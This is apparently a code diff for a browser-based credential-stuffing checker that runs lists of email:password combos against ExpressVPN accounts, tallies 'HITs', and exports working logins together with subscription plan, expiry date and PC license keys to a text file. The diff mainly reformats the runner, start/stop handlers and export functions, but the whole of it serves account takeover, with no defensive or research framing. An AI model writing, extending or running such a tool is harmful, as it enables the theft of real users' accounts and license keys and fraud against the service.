+      valid: json.valid === true,
+      hit: json.hit === true,
+      plan: json.plan || null,
+      expiry: json.expiry || null,
+      pcKey: json.pcKey || null,
+      keyExpire: json.keyExpire || null,
+      keyStatus: json.keyStatus || null,
+      message: json.message || ''
     };
   } catch (err) {
     return { username, password, valid: false, hit: false, message: 'Error: ' + err.message };
@@ -523,54 +736,98 @@ async function checkOne(username, password) {
 async function runner() {
   if (!running) return;
   if (currentIdx >= combos.length) {
-    running = false; startBtn.disabled = false; stopBtn.disabled = true;
-    setStatus('✅ Completed · ' + stats.hits + ' HIT(s)'); return;
+    running = false;
+    startBtn.disabled = false;
+    stopBtn.disabled = true;
+    setStatus('✅ Completed · ' + stats.hits + ' HIT(s)');
+    return;
   }
   const c = combos[currentIdx];
   setStatus(`🔍 ${currentIdx + 1}/${combos.length} · ${c.username}`);
   const r = await checkOne(c.username, c.password);
-  if (r === null) { running = false; startBtn.disabled = false; stopBtn.disabled = true; return; }
+  if (r === null) {
+    running = false;
+    startBtn.disabled = false;
+    stopBtn.disabled = true;
+    return;
+  }
   results.push(r);
-  stats.checked++; if (r.hit) stats.hits++; else stats.fails++;
-  updateStats(); renderAll();
+  stats.checked++;
+  if (r.hit) stats.hits++; else stats.fails++;
+  updateStats();
+  renderAll();
   currentIdx++;
-  if (running && currentIdx < combos.length) setTimeout(runner, 300);
-  else { running = false; startBtn.disabled = false; stopBtn.disabled = true; setStatus('✅ Completed · ' + stats.hits + ' HIT(s)'); }
+
+  if (running && currentIdx < combos.length) {
+    setTimeout(runner, 300);
+  } else {
+    running = false;
+    startBtn.disabled = false;
+    stopBtn.disabled = true;
+    setStatus('✅ Completed · ' + stats.hits + ' HIT(s)');
+  }
 }
 
 startBtn.addEventListener('click', () => {
   const parsed = parseCombos(comboInput.value);
   if (!parsed.length) return showToast('❌ No valid combos');
-  combos = parsed; results = []; currentIdx = 0;
+  combos = parsed;
+  results = [];
+  currentIdx = 0;
   stats = { total: combos.length, checked: 0, hits: 0, fails: 0 };
-  updateStats(); renderAll();
-  running = true; startBtn.disabled = true; stopBtn.disabled = false;
-  setStatus('🚀 Starting...'); runner();
+  updateStats();
+  renderAll();
+  running = true;
+  startBtn.disabled = true;
+  stopBtn.disabled = false;
+  setStatus('🚀 Starting...');
+  runner();
 });
-stopBtn.addEventListener('click', () => { running = false; startBtn.disabled = false; stopBtn.disabled = true; setStatus('⏸️ Stopped'); });
+
+stopBtn.addEventListener('click', () => {
+  running = false;
+  startBtn.disabled = false;
+  stopBtn.disabled = true;
+  setStatus('⏸️ Stopped');
+});
 
 exportHitsBtn.addEventListener('click', () => {
   const h = results.filter(r => r.hit);
   if (!h.length) return showToast('❌ No hits');
   const txt = h.map(x =>
-    `📧 Email: ${x.username}\n🔑 Password: ${x.password}\n📋 Plan: ${x.plan||'—'}\n📅 Expiry: ${x.expiry||'—'}\n🔑 PC Key: ${x.pcKey||'—'}\n📅 Key Expiry: ${x.keyExpire||'—'}\n📌 Status: ${x.keyStatus||'—'}\n---`
+    `📧 Email: ${x.username}\n🔑 Password: ${x.password}\n📋 Plan: ${x.plan || '—'}\n📅 Expiry: ${x.expiry || '—'}\n🔑 PC Key: ${x.pcKey || '—'}\n📅 Key Expiry: ${x.keyExpire || '—'}\n📌 Status: ${x.keyStatus || '—'}\n---`
   ).join('\n\n');
-  dl(txt, 'expressvpn_hits.txt'); showToast('📥 ' + h.length + ' hit(s)');
+  dl(txt, 'expressvpn_hits.txt');
+  showToast('📥 ' + h.length + ' hit(s)');
 });
+
 exportAllBtn.addEventListener('click', () => {
   if (!results.length) return showToast('❌ Empty');
-  const txt = results.map(r => `[${r.hit?'HIT':'FAIL'}] ${r.username}:${r.password} | ${r.plan||'—'} | ${r.expiry||'—'}`).join('\n');
-  dl(txt, 'expressvpn_all.txt'); showToast('📄 Exported');
+  const txt = results.map(r =>
+    `[${r.hit ? 'HIT' : 'FAIL'}] ${r.username}:${r.password} | ${r.plan || '—'} | ${r.expiry || '—'}`
+  ).join('\n');
+  dl(txt, 'expressvpn_all.txt');
+  showToast('📄 Exported');
 });
+
 function dl(text, name) {
-  const b = new Blob([text], {type:'text/plain'}); const u = URL.createObjectURL(b);
-  const a = document.createElement('a'); a.href = u; a.download = name;
-  document.body.appendChild(a); a.click(); document.body.removeChild(a); URL.revokeObjectURL(u);
+  const b = new Blob([text], { type: 'text/plain' });
+  const u = URL.createObjectURL(b);
+  const a = document.createElement('a');
+  a.href = u;
+  a.download = name;
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  URL.revokeObjectURL(u);
 }
 
-// ===== Init =====
+// ============================================================
+//  Init
+// ============================================================
 (async () => {
-  updateStats(); renderAll();
+  updateStats();
+  renderAll();
   const u = await verifyToken();
   if (u) showApp(u.username);
   else showLogin();
